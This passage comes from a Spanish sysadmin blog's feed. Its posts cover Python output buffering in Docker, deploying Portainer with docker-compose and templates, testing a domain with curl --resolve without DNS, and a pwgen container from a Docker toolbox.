&lt;p&gt;Podemos comprobar que hace lo que se le supone. Sin embargo, el problema aparece al crear una imagen para su ejecución con &lt;strong&gt;docker&lt;/strong&gt;. Vamos a usar una imagen base de &lt;em&gt;DockerHub&lt;/em&gt; para mantener la dimensión del problema bajo control.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/poller$ cat Dockerfile 
FROM python:2-slim
COPY poll.py /
CMD &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;python&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;poll.py&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@aldebaran:~/docker/poller$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Tras construir la imagen, vemos que no hay salida durante su ejecución:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/poller$ docker run --name poller -d poller
314d32b425d1d222527678fc15c73147162d62195c56422fc90729e9b4f6594b
gerard@aldebaran:~/docker/poller$ sleep &lt;span class="m"&gt;10&lt;/span&gt;
gerard@aldebaran:~/docker/poller$ docker logs poller
gerard@aldebaran:~/docker/poller$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Tras 10 segundos de espera, el &lt;em&gt;script&lt;/em&gt; debería haber escrito unas 10 veces en la salida, y sin embargo no muestra nada.&lt;/p&gt;
&lt;h2&gt;La causa&lt;/h2&gt;
&lt;p&gt;Tras mucho esperar, me di cuenta de un factor interesante: tras varios minutos, se añadían muchas líneas en la salida, con sus &lt;em&gt;timestamps&lt;/em&gt; diferenciados entre sí por un segundo, más o menos.&lt;/p&gt;
&lt;p&gt;el primer pensamiento que viene en mi cabeza ante este comportamiento, es &lt;em&gt;buffering&lt;/em&gt;; no se trata de que la salida no sale, sino que sale en paquetes grandes, que se han ido acumulando en un &lt;em&gt;buffer&lt;/em&gt; para optimizar las escrituras a los dispositivos permanentes.&lt;/p&gt;
&lt;p&gt;Como esto no es aceptable para mi aplicación, intenté buscar en &lt;strong&gt;python&lt;/strong&gt; una respuesta satisfactoria, encontrándola en &lt;a href="https://docs.python.org/2/using/cmdline.html#cmdoption-u"&gt;la documentación&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Parece ser que &lt;strong&gt;python&lt;/strong&gt; acepta una opción &lt;em&gt;-u&lt;/em&gt; en la línea de comandos, o una variable de entorno &lt;strong&gt;PYTHONUNBUFFERED&lt;/strong&gt; que elimina el comportamiento &lt;em&gt;buffereado&lt;/em&gt; de la salida estándar.&lt;/p&gt;
&lt;h2&gt;La solución&lt;/h2&gt;
&lt;p&gt;Sabiendo la causa del problema, la solución es todavía más simple: solo se trata de desactivar este comportamiento.&lt;/p&gt;
&lt;p&gt;Esto se consigue con alguna de las dos opciones siguientes:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Podemos invocar el intérprete con el &lt;em&gt;flag -u&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;Podemos hacer que el intérprete se ejecute en un entorno que defina la variable &lt;strong&gt;PYTHONUNBUFFERED&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Así pues, y tras modificar un poco nuestro &lt;em&gt;Dockerfile&lt;/em&gt;, el problema deja de existir.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/poller$ cat Dockerfile 
FROM python:2-slim
COPY poll.py /
CMD &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;python&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;-u&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;poll.py&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@aldebaran:~/docker/poller$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y de esta forma podemos repetir el &lt;em&gt;test&lt;/em&gt; inicial, para demostrar que ya no nos ocurre de nuevo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/poller$ docker run --name poller -d poller
bb3bdaaf5ef92e2f38a70b30163abd335920aa940eb1327716eac3fa656ad651
gerard@aldebaran:~/docker/poller$ sleep &lt;span class="m"&gt;10&lt;/span&gt;
gerard@aldebaran:~/docker/poller$ docker logs poller
&lt;span class="m"&gt;13&lt;/span&gt;:24:08
&lt;span class="m"&gt;13&lt;/span&gt;:24:09
&lt;span class="m"&gt;13&lt;/span&gt;:24:10
&lt;span class="m"&gt;13&lt;/span&gt;:24:11
&lt;span class="m"&gt;13&lt;/span&gt;:24:12
&lt;span class="m"&gt;13&lt;/span&gt;:24:13
&lt;span class="m"&gt;13&lt;/span&gt;:24:14
&lt;span class="m"&gt;13&lt;/span&gt;:24:15
&lt;span class="m"&gt;13&lt;/span&gt;:24:16
&lt;span class="m"&gt;13&lt;/span&gt;:24:17
&lt;span class="m"&gt;13&lt;/span&gt;:24:18
&lt;span class="m"&gt;13&lt;/span&gt;:24:19
&lt;span class="m"&gt;13&lt;/span&gt;:24:20
&lt;span class="m"&gt;13&lt;/span&gt;:24:21
&lt;span class="m"&gt;13&lt;/span&gt;:24:22
gerard@aldebaran:~/docker/poller$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;De hecho, el comportamiento es más evidente si vemos los &lt;em&gt;logs&lt;/em&gt; en modo &lt;em&gt;follow&lt;/em&gt;, o lo que es lo mismo, usando el &lt;em&gt;flag -f&lt;/em&gt;. Con él podemos ver como salta una traza cada segundo, de forma puntual y sin retardos.&lt;/p&gt;</content><category term="python"></category><category term="docker"></category><category term="buffering"></category><category term="logs"></category><category term="salida estándar"></category></entry><entry><title>Administrando Docker vía web: Portainer</title><link href="http://www.linuxsysadmin.ml/2017/04/administrando-docker-via-web-portainer.html" rel="alternate"></link><published>2017-04-24T10:00:00+02:00</published><updated>2017-04-24T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-04-24:/2017/04/administrando-docker-via-web-portainer.html</id><summary type="html">&lt;p&gt;El otro día me topé con un desarrollador que quiere desplegar sus contenedores &lt;strong&gt;Docker&lt;/strong&gt; en el servidor de integración, pero no conoce la sintaxis del comando &lt;em&gt;docker&lt;/em&gt; y prefiere una interfaz gráfica. Eso me llevó a investigar, buscando una opción bonita, funcional y ligera; al final, me topé con &lt;strong&gt;Portainer …&lt;/strong&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;El otro día me topé con un desarrollador que quiere desplegar sus contenedores &lt;strong&gt;Docker&lt;/strong&gt; en el servidor de integración, pero no conoce la sintaxis del comando &lt;em&gt;docker&lt;/em&gt; y prefiere una interfaz gráfica. Eso me llevó a investigar, buscando una opción bonita, funcional y ligera; al final, me topé con &lt;strong&gt;Portainer&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Podemos encontrar la imagen en &lt;strong&gt;DockerHub&lt;/strong&gt; en &lt;a href="https://hub.docker.com/r/portainer/portainer/"&gt;este link&lt;/a&gt;, así como una ligera descripción.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Portainer is a lightweight management UI which allows you to easily manage your Docker host or Swarm cluster.
Portainer is meant to be as simple to deploy as it is to use. It consists of a single container that can run on any Docker engine (Docker for Linux and Docker for Windows are supported).
Portainer allows you to manage your Docker containers, images, volumes, networks and more ! It is compatible with the standalone Docker engine and with Docker Swarm.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;Instalación de portainer&lt;/h2&gt;
&lt;p&gt;Levantar el contenedor no tiene ningún misterio; basta con seguir las instrucciones de &lt;strong&gt;DockerHub&lt;/strong&gt; y las que nos pueda ofrecer la aplicación. Empezaremos haciendo un &lt;code&gt;docker pull portainer/portainer&lt;/code&gt;, para tener la imagen en local y maravillarnos de su ligereza: se trata solo de 10mb.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker$ docker images
REPOSITORY            TAG                 IMAGE ID            CREATED             SIZE
portainer/portainer   latest              1ad990af4145        &lt;span class="m"&gt;5&lt;/span&gt; hours ago         &lt;span class="m"&gt;9&lt;/span&gt;.96 MB
gerard@aldebaran:~/docker$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Mirando &lt;a href="http://portainer.io/install.html"&gt;la página web&lt;/a&gt;, vemos que levantar el contenedor no tiene ninguna dificultad; se trata de ejecutar la imagen tal cual, exponiendo el puerto 9000 a nuestra máquina &lt;em&gt;host&lt;/em&gt; de &lt;strong&gt;docker&lt;/strong&gt;, para su fácil acceso vía web. También le voy a dar un nombre de contenedor para su fácil administración.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker$ docker run -d -p &lt;span class="m"&gt;9000&lt;/span&gt;:9000 --name portainer portainer/portainer
afcc57cfb1d0002d7e43cbdd5e6fcd0c6ada594eeac62132722e25cbb4569270
gerard@aldebaran:~/docker$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Apuntando el navegador a la dirección IP del &lt;em&gt;host&lt;/em&gt;, con HTTP en el puerto 9000, vemos que ha levantado. La primera vez nos va a pedir una contraseña para el usuario &lt;em&gt;admin&lt;/em&gt;, así que la rellenamos. Lo siguiente es declarar el &lt;strong&gt;Docker Engine&lt;/strong&gt; o el &lt;strong&gt;Docker Swarm&lt;/strong&gt; que queramos controlar. Como yo quiero controlar mi &lt;strong&gt;Docker Engine&lt;/strong&gt; local, lo indico; y me salta una advertencia de que necesita el &lt;em&gt;unix socket&lt;/em&gt; de &lt;strong&gt;docker&lt;/strong&gt; mapeado en el contenedor.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;On Linux and when using Docker for Mac or Docker for Windows or Docker Toolbox, ensure that you have started Portainer container with the following Docker flag -v "/var/run/docker.sock:/var/run/docker.sock"&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Esto significa parar el contenedor y levantarlo de nuevo con el nuevo volumen. También significa que vamos a tener que introducir la contraseña para el usuario &lt;em&gt;admin&lt;/em&gt;. Mirando &lt;a href="https://portainer.readthedocs.io/en/stable/deployment.html#persist-portainer-data"&gt;la documentación&lt;/a&gt;, vemos que nos basta con poner la carpeta &lt;em&gt;/data/&lt;/em&gt; en un volumen del &lt;em&gt;host&lt;/em&gt; para persistir las configuraciones.&lt;/p&gt;
&lt;p&gt;Esto nos alarga la línea de comandos a ejecutar y empieza a ser tedioso de poner. Como siempre, &lt;strong&gt;docker-compose&lt;/strong&gt; al poder.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/portainer$ cat docker-compose.yml
version: &lt;span class="s1"&gt;&amp;#39;2&amp;#39;&lt;/span&gt;
services:
  portainer:
    image: portainer/portainer
    container_name: portainer
    hostname: portainer
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
      - ./volumes/data:/data
    ports:
      - &lt;span class="s2"&gt;&amp;quot;9000:9000&amp;quot;&lt;/span&gt;
gerard@aldebaran:~/docker/portainer$ docker-compose up -d
Creating network &lt;span class="s2"&gt;&amp;quot;portainer_default&amp;quot;&lt;/span&gt; with the default driver
Creating portainer
gerard@aldebaran:~/docker/portainer$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Tras poner por última vez la contraseña del usuario &lt;em&gt;admin&lt;/em&gt; e indicar que queremos controlar la instancia local, ya tenemos la interfaz ejecutando.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Portainer dashboard" src="http://www.linuxsysadmin.ml/images/portainer-dashboard.jpg"&gt;&lt;/p&gt;
&lt;p&gt;En esta interfaz podremos lanzar todas las operaciones habituales cómodamente desde la web. Con ella podemos administrar las imágenes, los contenedores, las redes y los volúmenes.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;AVISO&lt;/strong&gt;: &lt;strong&gt;Portainer&lt;/strong&gt; no tiene ningún sistema de persistencia y los comandos son enviados desde el formulario directamente al demonio de &lt;strong&gt;Docker&lt;/strong&gt;; no se puede editar un contenedor creado, solo se puede recrearlo, de cero. Si os equivocáis, por ejemplo en una variable de entorno, no os queda más opción que recrear el contenedor entero.&lt;/p&gt;
&lt;h2&gt;Plantillas&lt;/h2&gt;
&lt;p&gt;Las plantillas son formas bonitas de levantar imágenes. Nos permiten elegir las plantillas con botones y luego nos dan un formulario prefabricado para rellenar variables de entorno. Nada más.&lt;/p&gt;
&lt;p&gt;Si usamos variables de entorno para configurar nuestros contenedores, son de gran ayuda. El conjunto básico de plantillas es muy limitado, pero se puede ampliar; nuevamente la respuesta está en &lt;a href="https://portainer.readthedocs.io/en/stable/templates.html"&gt;la documentación&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Muy a &lt;em&gt;grosso&lt;/em&gt; modo, las plantillas disponibles se declaran en un fichero &lt;em&gt;templates.json&lt;/em&gt;, que se descarga remotamente y se indica su localización con el &lt;em&gt;docker command&lt;/em&gt; &lt;code&gt;--templates http://portainer-templates/templates.json&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Este fichero se puede servir con cualquier servidor web del que dispongamos, o si no tenemos uno, podemos construir una imagen con &lt;strong&gt;nginx&lt;/strong&gt;, por ejemplo. La documentación da detalles de como hacerlo.&lt;/p&gt;
&lt;p&gt;Yo mismo he creado mi propio contenedor &lt;strong&gt;nginx&lt;/strong&gt; para servir mi fichero de plantillas, con &lt;strong&gt;Alpine Linux&lt;/strong&gt;. No voy a poner como porque no es el &lt;em&gt;scope&lt;/em&gt; de este artículo, pero si voy a actualizar el fichero &lt;em&gt;docker-compose.yml&lt;/em&gt; para ver el resultado final.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/portainer$ cat docker-compose.yml 
version: &lt;span class="s1"&gt;&amp;#39;2&amp;#39;&lt;/span&gt;
services:
  portainer:
    image: portainer/portainer
    container_name: portainer
    hostname: portainer
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
      - ./volumes/data:/data
    ports:
      - &lt;span class="s2"&gt;&amp;quot;9000:9000&amp;quot;&lt;/span&gt;
    command: --templates http://portainer-templates/templates.json
  portainer-templates:
    image: portainer-templates
    container_name: portainer-templates
    hostname: portainer-templates
    volumes:
      - ./volumes/templates/templates.json:/srv/www/templates.json:ro
gerard@aldebaran:~/docker/portainer$ docker-compose up -d
Creating portainer-templates
Creating portainer
gerard@aldebaran:~/docker/portainer$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora solo queda crear un fichero con contenido adecuado de acuerdo a la documentación, que iremos actualizando a lo largo de la vida de nuestro proyecto. Solo voy a poner un &lt;em&gt;snippet&lt;/em&gt; del fichero para que os hagáis una idea de como es:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/portainer$ cat volumes/templates/templates.json 
&lt;span class="o"&gt;[&lt;/span&gt;
    &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="s2"&gt;&amp;quot;title&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Kittens&amp;quot;&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;description&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;A beautiful kitten listing&amp;quot;&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;logo&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;https://s-media-cache-ak0.pinimg.com/736x/5d/bb/17/5dbb17d702b29b11f46d7a9c7ea53891.jpg&amp;quot;&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;image&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;acme/kittens&amp;quot;&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;env&amp;quot;&lt;/span&gt;: &lt;span class="o"&gt;[&lt;/span&gt;
            &lt;span class="o"&gt;{&lt;/span&gt;
                &lt;span class="s2"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;ENTORNO&amp;quot;&lt;/span&gt;,
                &lt;span class="s2"&gt;&amp;quot;label&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;ENTORNO&amp;quot;&lt;/span&gt;
            &lt;span class="o"&gt;}&lt;/span&gt;,
            &lt;span class="o"&gt;{&lt;/span&gt;
                &lt;span class="s2"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;MONGO_URL&amp;quot;&lt;/span&gt;,
                &lt;span class="s2"&gt;&amp;quot;label&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;MONGO_URL&amp;quot;&lt;/span&gt;
            &lt;span class="o"&gt;}&lt;/span&gt;
        &lt;span class="o"&gt;]&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;,
    &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="s2"&gt;&amp;quot;title&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;MongoDB&amp;quot;&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;description&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;MongoDB is a free and open-source cross-platform document-oriented database&amp;quot;&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;logo&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;https://media.glassdoor.com/sqll/433703/mongodb-squarelogo-1407269491216.png&amp;quot;&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;image&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;acme/mongo&amp;quot;&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;]&lt;/span&gt;
gerard@aldebaran:~/docker/portainer$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En este caso dispondríamos de dos plantillas. La primera utiliza la imagen &lt;em&gt;acme/kittens&lt;/em&gt; y necesita dos variables de entorno. La segunda utiliza la imagen &lt;em&gt;acme/mongo&lt;/em&gt; y no necesita variables de entorno.&lt;/p&gt;</content><category term="docker"></category><category term="portainer"></category></entry><entry><title>Testear dominios sin tener el DNS con curl</title><link href="http://www.linuxsysadmin.ml/2017/04/testear-dominios-sin-tener-el-dns-con-curl.html" rel="alternate"></link><published>2017-04-17T00:00:00+02:00</published><updated>2017-04-17T00:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-04-17:/2017/04/testear-dominios-sin-tener-el-dns-con-curl.html</id><summary type="html">&lt;p&gt;En mi trabajo, los problemas llegan sin previo aviso. De repente, alguien te pone en aviso que su aplicación web está caída y es inaccesible. Se trata de un problema de resolución DNS, pero queremos probarlo para estar seguros de que solo es ese el problema y no es general …&lt;/p&gt;</summary><content type="html">&lt;p&gt;En mi trabajo, los problemas llegan sin previo aviso. De repente, alguien te pone en aviso que su aplicación web está caída y es inaccesible. Se trata de un problema de resolución DNS, pero queremos probarlo para estar seguros de que solo es ese el problema y no es general.&lt;/p&gt;
&lt;p&gt;Lo primero que nos viene a la cabeza es montar un servidor DNS local e intentar acceder de nuevo, pero es mucho trabajo. Luego nos acordamos del fichero &lt;em&gt;/etc/hosts&lt;/em&gt;, pero no siempre es posible editarlo. Sin embargo, el comando &lt;strong&gt;curl&lt;/strong&gt; nos ofrece una opción para suplantar un dominio con la dirección IP que queramos.&lt;/p&gt;
&lt;h2&gt;Preparación&lt;/h2&gt;
&lt;p&gt;Vamos a crear un servidor web con contenido irrelevante solo para ver una demostración de como funciona esta opción. Para ello empezaremos instalando un servidor web cualquiera. Ya sabéis que me gusta mucho el &lt;strong&gt;nginx&lt;/strong&gt;...&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@helium:~# apt-get install -y nginx-light
Reading package lists... Done
Building dependency tree       
Reading state information... Done
The following extra packages will be installed:
  nginx-common
Suggested packages:
  fcgiwrap nginx-doc ssl-cert
The following NEW packages will be installed:
  nginx-common nginx-light
&lt;span class="m"&gt;0&lt;/span&gt; upgraded, &lt;span class="m"&gt;2&lt;/span&gt; newly installed, &lt;span class="m"&gt;0&lt;/span&gt; to remove and &lt;span class="m"&gt;2&lt;/span&gt; not upgraded.
Need to get &lt;span class="m"&gt;421&lt;/span&gt; kB of archives.
After this operation, &lt;span class="m"&gt;1020&lt;/span&gt; kB of additional disk space will be used.
...
root@helium:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos a eliminar el &lt;em&gt;site&lt;/em&gt; que viene por defecto porque es un ejemplo y no es relevante.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@helium:~# unlink /etc/nginx/sites-enabled/default 
root@helium:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Crearemos una carpeta para alojar el contenido web. Según la &lt;a href="https://es.wikipedia.org/wiki/Filesystem_Hierarchy_Standard"&gt;FHS&lt;/a&gt;, lo correcto es usar &lt;em&gt;/srv/www&lt;/em&gt;, que no viene en una distribución &lt;strong&gt;Debian&lt;/strong&gt; por defecto.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@helium:~# mkdir /srv/www
root@helium:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ponemos una página web cualquiera, solo para ver si llegamos o no a nuestro servidor.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@helium:~# &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Hello World&amp;quot;&lt;/span&gt; &amp;gt; /srv/www/index.html
root@helium:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y vamos a crear un &lt;em&gt;site&lt;/em&gt; para que nuestro &lt;strong&gt;nginx&lt;/strong&gt; sepa lo que tiene que servir:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@helium:~# cat /etc/nginx/sites-enabled/example 
server &lt;span class="o"&gt;{&lt;/span&gt;
    listen &lt;span class="m"&gt;80&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    server_name _&lt;span class="p"&gt;;&lt;/span&gt;
    root /srv/www&lt;span class="p"&gt;;&lt;/span&gt;
    index index.html&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
root@helium:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Recargamos o reiniciamos el servidor web para que use la nueva configuración y listo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@helium:~# service nginx reload
&lt;span class="o"&gt;[&lt;/span&gt; ok &lt;span class="o"&gt;]&lt;/span&gt; Reloading nginx configuration: nginx.
root@helium:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora tenemos un servidor web normal y corriente en nuestro entorno.&lt;/p&gt;
&lt;h2&gt;Funcionamiento&lt;/h2&gt;
&lt;p&gt;Vamos ha hacer una petición a nuestro dominio. Voy a usar esta misma web por comodidad, pero si tenéis un dominio que no funciona por culpa del DNS, también lo podéis comprobar ahí.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~$ curl -s http://www.linuxsysadmin.tk/ &lt;span class="p"&gt;|&lt;/span&gt; grep &lt;span class="s1"&gt;&amp;#39;&amp;lt;title&amp;gt;&amp;#39;&lt;/span&gt;
    &amp;lt;title&amp;gt;Linux Sysadmin&amp;lt;/title&amp;gt;
gerard@aldebaran:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Magnífico; esta es la web. Vamos ahora a pedirle a &lt;strong&gt;curl&lt;/strong&gt; que resuelva las peticiones a este mismo dominio y puerto 80 usando la dirección de nuestro servidor, con la opción &lt;em&gt;--resolve&lt;/em&gt;. Más información en las páginas &lt;strong&gt;man&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~$ curl -s --resolve www.linuxsysadmin.tk:80:172.18.0.2 http://www.linuxsysadmin.tk/
Hello World
gerard@aldebaran:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto vemos que este comando ha pasado olímpicamente de lo que le decía el DNS y ha lanzado la petición a nuestro servidor, cuya dirección IP es 172.18.0.2, que es el que hemos preparado más arriba.&lt;/p&gt;
&lt;p&gt;Y con este truco tan simple pudimos comprobar que el problema era solo de DNS, ya que si lo evitamos con &lt;strong&gt;curl&lt;/strong&gt;, el resto funcionaba a la perfección.&lt;/p&gt;</content><category term="curl"></category><category term="dns"></category></entry><entry><title>Una toolbox empaquetada en contenedores</title><link href="http://www.linuxsysadmin.ml/2017/04/una-toolbox-empaquetada-en-contenedores.html" rel="alternate"></link><published>2017-04-10T10:00:00+02:00</published><updated>2017-04-10T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-04-10:/2017/04/una-toolbox-empaquetada-en-contenedores.html</id><summary type="html">&lt;p&gt;Muchas veces necesitamos herramientas para nuestro trabajo y no las usamos desde la misma máquina; otras veces no queremos instalar muchos paquetes en nuestra máquina. Tener una máquina virtual suele ser &lt;em&gt;overkill&lt;/em&gt; para ejecutar algunos binarios. En este caso podemos tener nuestras imágenes &lt;strong&gt;docker&lt;/strong&gt; listas para ser usadas según convenga …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Muchas veces necesitamos herramientas para nuestro trabajo y no las usamos desde la misma máquina; otras veces no queremos instalar muchos paquetes en nuestra máquina. Tener una máquina virtual suele ser &lt;em&gt;overkill&lt;/em&gt; para ejecutar algunos binarios. En este caso podemos tener nuestras imágenes &lt;strong&gt;docker&lt;/strong&gt; listas para ser usadas según convenga.&lt;/p&gt;
&lt;p&gt;En este artículo vamos a ver algunos ejemplos de imágenes de mi &lt;em&gt;toolbox&lt;/em&gt; como inspiración para otras, demostrando que podemos tener nuestras herramientas con una portabilidad máxima, y sin ocupar tanto espacio como nos podríamos imaginar; y lo mejor de todo: de usar y tirar, sin ensuciar nuestras distribuciones habituales.&lt;/p&gt;
&lt;h2&gt;Generando contraseñas&lt;/h2&gt;
&lt;p&gt;Creo que este es el peor ejemplo, ya que hay miles de webs que hacen esto mismo, pero cumple con la función didáctica. Hay un paquete en linux llamado &lt;strong&gt;pwgen&lt;/strong&gt; que nos ofrece el binario con el mismo nombre. Solo necesitamos un contenedor que invoque esta herramienta, escriba una contraseña aleatoria y se acabe, sin dejar nada instalado.&lt;/p&gt;
&lt;p&gt;Este paquete está disponible en &lt;strong&gt;Alpine Linux&lt;/strong&gt;, así que es muy fácil generar el contenedor con un tamaño adecuado. solamente necesitamos instalarlo y darle el comando base.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@hermes:~/docker/tools$ cat pwgen/Dockerfile 
FROM alpine:3.4
RUN apk add --no-cache pwgen
CMD &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;pwgen&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;-cnyB&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;8&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;1&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@hermes:~/docker/tools$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Lo podemos construir si no lo tuviéramos, o lo podemos descargar de un registro &lt;strong&gt;docker&lt;/strong&gt;. Ocupa menos de 5 mb, contando el sistema operativo; nada mal.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@hermes:~/docker/tools$ docker build -t pwgen pwgen/
...
gerard@hermes:~/docker/tools$ docker images
REPOSITORY                                                                            TAG                 IMAGE ID            CREATED             SIZE
pwgen                                                                                 latest              4b338afada4e        &lt;span class="m"&gt;19&lt;/span&gt; seconds ago      &lt;span class="m"&gt;4&lt;/span&gt;.844 MB
gerard@hermes:~/docker/tools$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;La ejecución es bastante simple también; basta con ejecutar hasta encontrar una contraseña que nos guste:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@hermes:~/docker/tools$ docker run --rm pwgen
Es4toh&lt;span class="o"&gt;(&lt;/span&gt;f
gerard@hermes:~/docker/tools$ docker run --rm pwgen
ieV7yoh&lt;span class="o"&gt;}&lt;/span&gt;
gerard@hermes:~/docker/tools$ docker run --rm pwgen
jei!s7ph
gerard@hermes:~/docker/tools$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Analizando el rendimiento de un servidor&lt;/h2&gt;
